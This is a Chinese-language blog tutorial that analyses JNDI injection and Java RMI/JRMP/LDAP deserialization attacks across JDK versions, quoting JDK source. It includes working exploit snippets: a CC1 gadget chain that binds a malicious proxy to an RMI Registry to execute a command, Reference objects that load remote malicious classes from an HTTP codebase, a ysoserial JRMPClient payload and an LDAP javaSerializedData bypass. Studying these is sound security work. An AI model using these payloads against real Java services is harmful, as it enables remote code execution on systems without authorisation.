---
title: JNDI注入分析
abbrlink: 28183
date: 2022-05-05 14:40:08
tags:
  - 知识点总结
  - Java反序列化
categories: 
  - Java
  - JNDI注入
description: JNDI注入分析
excerpt: JNDI注入分析
typora-root-url: JNDI注入分析
---

# JNDI注入分析

> 这篇文章很大一部分都来自[基于Java反序列化RCE - 搞懂RMI、JRMP、JNDI - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/7079#toc-0)和[搞懂RMI、JRMP、JNDI-终结篇 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/7264)

## 概念

### RMI 概念

RMI全称为Remote Method Invocation，翻译过来就是远程方法调用，通俗来说，就是跨JVM调用远程方法；与常规Java方法调用恰恰相反。

类似于HTTP接口调用，RMI也是调用，但是不同的是，调用的是Java方法。

即：RMI是一种行为，而该行为实际是Java远程方法调用。

### JRMP 概念

JRMP全称为Java Remote Method Protocol，翻译过来就是Java远程方法协议，通俗来讲，就是一个在TCP/IP之上的线路层协议，一个RMI的过程，是用JRMP协议去组织数据格式然后通过TCP进行传输，最后达到RMI。

类似于HTTP，这也是一个协议，只是该协议仅用于Java RMI中。

即：JRMP是一个协议，是用于Java RMI过程中的协议，只有使用这个协议，方法调用双方才能正常的进行数据交流。

### JNDI 概念

JNDI全称为Java Naming and Directory Interface，也就是Java命名和目录接口。既然是接口，那么就必定有其实现。目前Java中使用最多的基本就是RMI和LDAP的目录服务系统。

Naming(命令)的意思就是，在一个目录系统，实现了把一个服务名称和对象或命名引用相关联，在客户端，我们可以调用目录系统服务，并根据服务名称查询到相关联的对象或命名引用，然后返回给客户端。

Directory(目录)的意思就是，在命名的基础上，增加了属性的概念，我们可以想象一个文件目录中，每个文件和目录都会存在着一些属性，比如创建时间、读写执行权限等等，并且我们可以通过这些相关属性筛选出相应的文件和目录。

JNDI中的目录服务中的属性大概与之相似，因此，我们就可以在使用服务名称之外，通过一些关联属性查找到对应的对象。

即：JNDI是一个接口，在这个接口下会有多种目录系统服务的实现，我们能通过名称等去找到相关的对象，并把它下载到客户端中来。

## 从攻击层面来分析

### 使用InitialContext lookup一个JNDI的RMI、LDAP服务导致反序列化RCE

先给出例子的代码：

```java
public interface HelloService extends Remote {
    String doAction(String args[]) throws RemoteException;
}

public class HelloServiceImpl extends UnicastRemoteObject implements HelloService {

    protected HelloServiceImpl() throws RemoteException {
    }

    @Override
    public String doAction(String args[]) throws RemoteException {
        if (args != null){
            System.out.println("hello, " + args[0]);
            return "hello, " + args[0];
        }else{
            System.out.println("hello world!");
            return "hello world!";
        }
    }
}
```

同时启动一个1099端口的Registry注册服务：

```java
public class Main {

    public static void main(String[] args) {
        try {
            Registry registry = LocateRegistry.createRegistry(1099);
            registry.bind("hello", new HelloServiceImpl());
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

使用Java 1.8.0_131运行该程序。

然后再写一个程序。

```java
public interface HelloService extends Remote {
    String doAction(String args[]) throws RemoteException;
}

public class Main {

    public static void main(String[] args) {
        try {
            Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
            HelloService service = (HelloService) registry.lookup("hello");
            System.out.println(service.doAction(null));
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

启动程序，可以看到两个程序都输出了`hello world!`。

接下来说说其整体过程：

1. 第一个程序启动时，启动了一个RMI的注册中心，接着将HelloServiceImpl注册并暴露到了RMI注册中心
2. 第二个程序启动后，连接RMI注册中心，利用JNDI根据名称`hello`查询到了对应的对象，并将其数据下载到本地
3. 第二个程序下载的是一个Stub，根据Stub存储的信息(第一个程序中HelloServiceImpl实现暴露的IP和Port)，通过JRMP协议发起RMI请求
4. 接收到RMI请求后，第一个程序调用对应方法，输出`hello world!`并将方法返回值序列化返回给第二个程序
5. 第二个程序将受到的值反序列化得到方法返回值

可以看到，第二个程序进行`lookup`时，就会从Registry注册中心下载对应的数据，这里的下载是根据传入的Naming进行查找的。

如果想要进行RCE，可以向Registry注册Reference，有三个参数，`className`、`factory`、`classFactoryLocation`，当程序进行`lookup`并下载时，回使用Reference的`classFactoryLocation`指定的地址去下载`className`指定的`class`文件，并且加载实例化，从而使得程序`lookup`时加载远程恶意`class`实现RCE。

还是看例子：

```java
public class Main
{
    public static void main( String[] args )
    {
        try {
            Registry registry = LocateRegistry.createRegistry(1099);
            Reference reference = new Reference("Evil","Evil","http://127.0.0.1:8080/");
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("hello",referenceWrapper);
        } catch (RemoteException e) {
            e.printStackTrace();
        } catch (AlreadyBoundException e) {
            e.printStackTrace();
        } catch (NamingException e) {
            e.printStackTrace();
        }
    }
}
```

第二个程序：

```java
public class Main {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        try {
            new InitialContext().lookup("rmi://127.0.0.1:1099/hello");
        } catch (NamingException e) {
            e.printStackTrace();
        }
    }
}
```

注意，需要先将恶意类的Class文件放到本地HTTP8080端口下的根目录中。

此时可能出现问题：

> ```
> javax.naming.ConfigurationException: The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.
> ```

这是因为JDK8u121开始，Oracle开始设置默认系统变量`com.sun.jndi.rmi.object.trustURLCodebase`为`false`，这就导致通过RMI加载远程字节码不会被信任。

设置该系统变量的话可以发现能够成功加载恶意类字节码，但是一般来说对于攻击而言毫无意义。

绕过方式有两种：

1. 使用LDAP服务取代RMI服务（8u191开始引入了JRP290，加入了反序列化类过滤）
2. Tomcat-EL利用链，客户端需要存在依赖`tomcat-embed-el:V8.5.15`

### Registry自身被反序列化RCE

前面提到，在进行RMI时，返回值会被序列化传输给客户端，那么如果客户端连接到Registry并自己Bind呢？

来看一段代码：

```java
public class Main {
    public static void main(String[] args) {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"}),
        };
        Transformer transformer = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map ouputMap = LazyMap.decorate(innerMap,transformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(ouputMap,"pwn");
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        try {
            Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
            field.setAccessible(true);
            field.set(badAttributeValueExpException,tiedMapEntry);

            Map tmpMap = new HashMap();
            tmpMap.put("pwn",badAttributeValueExpException);
            Constructor<?> ctor = null;
            ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
            ctor.setAccessible(true);
            InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Override.class,tmpMap);

            Remote remote = Remote.class.cast(Proxy.newProxyInstance(Main.class.getClassLoader(), new Class[] {Remote.class}, invocationHandler));
            Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);
            registry.bind("pwn",remote);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

> 上面的代码陌生可以看看这篇文章：[JAVA反序列化漏洞总结 | 青 叶 (evalexp.top)](https://blog.evalexp.top/p/51973/#0x41-Commons-Collections-1链)

启动一个Registry，然后执行该程序，会发现注册中心弹出了计算器。

这实际上是因为在`bind("pwn", remote)`这里，Java在传输对象数据时，使用了原生的序列化进行，而注册中心反序列化时就因为CC1链反序列化漏洞被RCE了。

### JRMP互打

根据前面总结一下的话，其实可以发现，之所以能够利用反序列打服务端的话，是因为在传输数据时有序列化和反序列化，同样的，服务端也会返回数据，这个数据也是序列化后的，客户端收到也会反序列化。

这就不难理解为什么能够互打了。

* 服务端打客户端 ==> 客户端连上服务端时，服务端发送Payload给客户端
* 客户端打服务端 ==> 客户端使用JRMP协议直接发送Payload给服务端

## 从JDK不同版本源码来分析

### JDK < 8u121

创建RMI Registry，是使用`LocateRegistry.createRegistry(1099);`来创建的，这个方法执行后，会创建一个监听在1099端口的ServerSocket，当RMI服务端执行bind时，会发送Stub序列化数据，最后在RMI Registry的`sun.rmi.registry.RegistryImpl_Skel::dispatch`处理。

整体执行函数调用栈：

```java
dispatch:-1, RegistryImpl_Skel (sun.rmi.registry)
oldDispatch:450, UnicastServerRef (sun.rmi.server)
dispatch:294, UnicastServerRef (sun.rmi.server)
run:200, Transport$1 (sun.rmi.transport)
run:197, Transport$1 (sun.rmi.transport)
doPrivileged:-1, AccessController (java.security)
serviceCall:196, Transport (sun.rmi.transport)
handleMessages:568, TCPTransport (sun.rmi.transport.tcp)
run0:826, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
lambda$run$0:683, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
run:-1, 1640924712 (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$5)
doPrivileged:-1, AccessController (java.security)
run:682, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
runWorker:1142, ThreadPoolExecutor (java.util.concurrent)
run:617, ThreadPoolExecutor$Worker (java.util.concurrent)
run:745, Thread (java.lang)
```

来看一下bind方法：

```java
public void bind(String var1, Remote var2) throws AccessException, AlreadyBoundException, RemoteException {
    try {
      RemoteCall var3 = super.ref.newCall(this, operations, 0, 4905912898345647071L);

      try {
        ObjectOutput var4 = var3.getOutputStream();
        var4.writeObject(var1);
        var4.writeObject(var2);
      } catch (IOException var5) {
        throw new MarshalException("error marshalling arguments", var5);
      }

      super.ref.invoke(var3);
      super.ref.done(var3);
    } catch (RuntimeException var6) {
      throw var6;
    } catch (RemoteException var7) {
      throw var7;
    } catch (AlreadyBoundException var8) {
      throw var8;
    } catch (Exception var9) {
      throw new UnexpectedException("undeclared checked exception", var9);
    }
}
```

调用`ref`的`newCall`方法，第三个参数为0，并且向RMI Registry写入了两个序列化对象。

在`dispatch`中，对应`case 0`的方法如下：

```java
case 0:
        try {
          var11 = var2.getInputStream();
          var7 = (String)var11.readObject();
          var8 = (Remote)var11.readObject();
        } catch (IOException var94) {
          throw new UnmarshalException("error unmarshalling arguments", var94);
        } catch (ClassNotFoundException var95) {
          throw new UnmarshalException("error unmarshalling arguments", var95);
        } finally {
          var2.releaseInputStream();
        }

        var6.bind(var7, var8);

        try {
          var2.getResultStream(true);
          break;
        } catch (IOException var93) {
          throw new MarshalException("error marshalling return", var93);
        }
```

这里进行了反序列化，这样我们就可以通过RMI服务端去执行Bind，然后通过Java反序列化攻击RMI Registry注册中心，导致其RCE。

对于RMI客户端，其实执行`lookup`方法中：

```java
RemoteCall var2 = super.ref.newCall(this, operations, 2, 4905912898345647071L);
```

可以看到此时的`case`为2，然后`var3.writeObject(var1);`，向RMI Regsitry发送序列化数据，随后对RMI Regsitry返回的数据进行了反序列化`var23 = (Remote)var6.readObject()`，即从理论上来说，我们可以发送恶意序列化数据使用客户端攻击RMI Registry或者通过RMI Registry去攻击客户端。

到这里其实已经搞明白了两个目标的攻击方法：

1. RMI服务端使用bind方法主动攻击RMI Registry
2. RMI客户端使用lookup方法主动攻击RMI Registry
3. RMI Registry在客户端lookup时被动攻击客户端

现在还差一个RMI服务端，这个该如何攻击呢？

前面说过，客户端lookup下载的是Stub，而Stub中存储了客户端与服务端的交流。

其实`lookup`方法返回的是一个动态代理对象，真正的逻辑由`RemoteObjectInvocationHandler`执行，其执行函数调用栈：

```java
invoke:152, UnicastRef (sun.rmi.server)
invokeRemoteMethod:227, RemoteObjectInvocationHandler (java.rmi.server)
invoke:179, RemoteObjectInvocationHandler (java.rmi.server)
sayHello:-1, $Proxy0 (com.sun.proxy)
main:18, RMIClient (com.threedr3am.bug.rmi.client)
```

而在`UnicastRef`的`invoke`方法中，可以发现，对于远程调用的传参，实际上客户端会把参数进行序列化然后再传输到服务端，代码位于`sun.rmi.server.UnicastRef::marshalValue`

对于远程调用的结果，服务端返回的数据，客户端会对其进行反序列化，代码位于`sun.rmi.server.UnicastRef#unmarshalValue`。

在这里，实际就可以将序列化数据换成恶意序列化数据，就可以攻击服务端，同样服务端也可以攻击客户端。

但是想要利用反序列化进行攻击，那么就得有一个可以用的`gadget`。

在目标系统没有存在可用的`gadget`时，我们就可以使用`Reference`对象去进行攻击。

样例代码：

```java
Registry registry = LocateRegistry.getRegistry(1099);
//TODO 把resources下的Calc.class 或者 自定义修改编译后target目录下的Calc.class 拷贝到下面代码所示http://host:port的web服务器根目录即可
Reference reference = new Reference("Calc","Calc","http://localhost/");
ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
registry.bind("Calc",referenceWrapper);
```

这样客户端在Lookup时就会下载恶意Class并且loadClass加载恶意Class从而RCE。

### JDK == jdk8u121

在jdk8u121的时候，加入了反序列化白名单的机制，导致了几乎全部gadget都不能被反序列化了。

过滤的代码(RegistryImpl)如下：

```java
private static Status registryFilter(FilterInfo var0) {
    if (registryFilter != null) {
      Status var1 = registryFilter.checkInput(var0);
      if (var1 != Status.UNDECIDED) {
        return var1;
      }
    }

    if (var0.depth() > (long)REGISTRY_MAX_DEPTH) {
      return Status.REJECTED;
    } else {
      Class var2 = var0.serialClass();
      if (var2 == null) {
        return Status.UNDECIDED;
      } else {
        if (var2.isArray()) {
          if (var0.arrayLength() >= 0L && var0.arrayLength() > (long)REGISTRY_MAX_ARRAY_SIZE) {
            return Status.REJECTED;
          }

          do {
            var2 = var2.getComponentType();
          } while(var2.isArray());
        }

        if (var2.isPrimitive()) {
          return Status.ALLOWED;
        } else {
          return String.class != var2 && !Number.class.isAssignableFrom(var2) && !Remote.class.isAssignableFrom(var2) && !Proxy.class.isAssignableFrom(var2) && !UnicastRef.class.isAssignableFrom(var2) && !RMIClientSocketFactory.class.isAssignableFrom(var2) && !RMIServerSocketFactory.class.isAssignableFrom(var2) && !ActivationID.class.isAssignableFrom(var2) && !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED;
        }
      }
    }
}
```

可以看到是一个典型的白名单：

1. String.class
2. Number.class
3. Remote.class
4. Proxy.class
5. UnicastRef.class
6. RMIClientSocketFactory.class
7. RMIServerSocketFactory.class
8. ActivationID.class
9. UID.class

但是这个白名单也不是不能打。

参考YSO的`ysoserial.payloads.JRMPClient`：

```java
ObjID id = new ObjID(new Random().nextInt()); // RMI registry
TCPEndpoint te = new TCPEndpoint(host, port);
UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] {
    Registry.class
}, obj);
```

可以看到都在白名单内，这一个Payload发送给服务器前，需要在自己的服务器上使用JRMPListener启动监听，并且要有合适的链去进行攻击。具体分析不放在这讲了。

其本质就是让服务器反序列化时连接自己的服务器，然后自己的服务器发送恶意序列化数据进行攻击。

相当于：

1. 发送Payload给攻击服务器
2. 攻击服务器反序列化白名单内的Payload，与自己的服务器Registry建立连接
3. 自己的服务器Registry发送恶意的序列化数据
4. 攻击服务器反序列化恶意的序列化数据被攻击

在8u121后，对于使用Reference加载远程代码，JDK信任机制会通过判断环境变量`com.sun.jndi.rmi.object.trustURLCodebase`是否为`true`然后再加载，但是在121版本后默认为false了，那就没有办法通过RMI去打客户端了。

使用LDAP协议的JNDI还可以继续攻击。

### JDK > 8u191

在jdk8u191之后呢，系统变量`com.sun.jndi.ldap.object.trustURLCodebase`也为false了，这时，LDAP远程攻击代码也失效了。

此时，需要通过`javaSerializedData`返回序列化的`gadget`方式实现攻击。

在`com.sun.jndi.ldap.Obj`中，方法`decodeObject`：

```java
static Object decodeObject(Attributes var0) throws NamingException {
    String[] var2 = getCodebases(var0.get(JAVA_ATTRIBUTES[4]));

    try {
      Attribute var1;
      if ((var1 = var0.get(JAVA_ATTRIBUTES[1])) != null) {
        ClassLoader var3 = helper.getURLClassLoader(var2);
        return deserializeObject((byte[])((byte[])var1.get()), var3);
      } else if ((var1 = var0.get(JAVA_ATTRIBUTES[7])) != null) {
        return decodeRmiObject((String)var0.get(JAVA_ATTRIBUTES[2]).get(), (String)var1.get(), var2);
      } else {
        var1 = var0.get(JAVA_ATTRIBUTES[0]);
        return var1 == null || !var1.contains(JAVA_OBJECT_CLASSES[2]) && !var1.contains(JAVA_OBJECT_CLASSES_LOWER[2]) ? null : decodeReference(var0, var2);
      }
    } catch (IOException var5) {
      NamingException var4 = new NamingException();
      var4.setRootCause(var5);
      throw var4;
    }
}
```

这里可以看到判断了`JAVA_ATTRIBUTES[1]`是否为空，这个参数实际上是：

```java
static final String[] JAVA_ATTRIBUTES = new String[]{"objectClass", "javaSerializedData", "javaClassName", "javaFactory", "javaCodeBase", "javaReferenceAddress", "javaClassNames", "javaRemoteLocation"};
```

也就是名为`javaSerializedData`的参数，也就是说，还可以通过修改LDAP服务直接返回`javaSerializedData`参数的数据，从而达到RCE。

```java
e.addAttribute("javaSerializedData", classData);
```

## 参考文章

* [搞懂RMI、JRMP、JNDI-终结篇 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/7264)
* [基于Java反序列化RCE - 搞懂RMI、JRMP、JNDI - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/7079#toc-0)



